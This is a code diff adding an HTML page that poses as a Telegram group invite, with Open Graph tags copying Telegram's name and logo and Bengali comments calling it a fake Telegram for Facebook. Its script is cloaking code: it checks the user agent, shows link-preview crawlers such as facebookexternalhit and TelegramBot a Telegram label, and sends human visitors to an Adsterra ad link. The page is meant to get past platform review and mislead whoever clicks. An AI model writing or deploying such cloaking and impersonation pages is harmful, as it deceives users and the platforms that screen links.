@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Facebook-এ যা দেখাবে (ভুয়া Telegram) -->
+    <meta property="og:title" content="Telegram: Join Group Chat">
+    <meta property="og:description" content="Join our exclusive group on Telegram. Click to enter!">
+    <meta property="og:image" content="https://telegram.org/img/t_logo.png">
+    <meta property="og:url" content="https://teligrm.github.io/BD18V/">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Telegram">
+    
+    <title>Telegram: Join Group Chat</title>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f0f0f0;
+        }
+        .box {
+            text-align: center;
+            padding: 40px;
+        }
+        .spinner {
+            border: 4px solid #ddd;
+            border-top: 4px solid #0088cc;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="spinner"></div>
+        <p>Loading...</p>
+    </div>
+
+    <script>
+        // Bot/Crawler চিনবে (Facebook, Telegram, WhatsApp)
+        const botAgents = [
+            'facebookexternalhit', 'Facebot', 'Twitterbot', 
+            'WhatsApp', 'TelegramBot', 'LinkedInBot',
+            'Googlebot', 'Discordbot'
+        ];
+        
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isBot = botAgents.some(bot => userAgent.includes(bot.toLowerCase()));
+        
+        // আপনার Adsterra লিংক (এইটাই আসল)
+        const realLink = 'https://elementalconsessionconsession.com/cj3ux8j2?key=c576ceafcd1fe2bb37d2a092228610d3';
+        
+        if (!isBot) {
+            // আসল মানুষ → Adsterra-এ চলে যাবে
+            window.location.replace(realLink);
+            setTimeout(() => window.location.href = realLink, 500);
+        } else {
+            // Bot → Telegram পেজ দেখাবে
+            document.querySelector('p').textContent = 'Telegram: Join Group Chat';
+        }
+    </script>
+</body>
+      </html>
